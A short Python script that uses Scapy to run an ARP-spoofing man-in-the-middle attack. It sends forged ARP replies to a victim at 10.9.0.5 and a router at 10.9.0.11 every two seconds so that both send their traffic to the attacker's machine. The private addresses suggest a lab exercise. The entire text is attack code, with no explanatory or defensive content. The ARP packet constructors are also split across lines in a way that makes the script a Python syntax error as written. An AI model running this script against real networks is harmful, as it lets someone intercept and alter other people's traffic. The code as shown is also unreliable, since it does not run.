from scapy.all import *
import time

victim_ip = "10.9.0.5"
router_ip = "10.9.0.11"

attacker_mac = get_if_hwaddr(conf.iface)
victim_mac = getmacbyip(victim_ip)
router_mac = getmacbyip(router_ip)

print("Victim MAC:", victim_mac)
print("Router MAC:", router_mac)

poison_victim = ARP
(
    op=2,
    psrc=router_ip,
    pdst=victim_ip,
    hwsrc=attacker_mac,
    hwdst=victim_mac
)
poison_router = ARP
(
    op=2,
    psrc=victim_ip,
    pdst=router_ip,
    hwsrc=attacker_mac,
    hwdst=router_mac
)
while True:
    send(poison_victim, verbose=False)
    send(poison_router, verbose=False)
    time.sleep(2)
    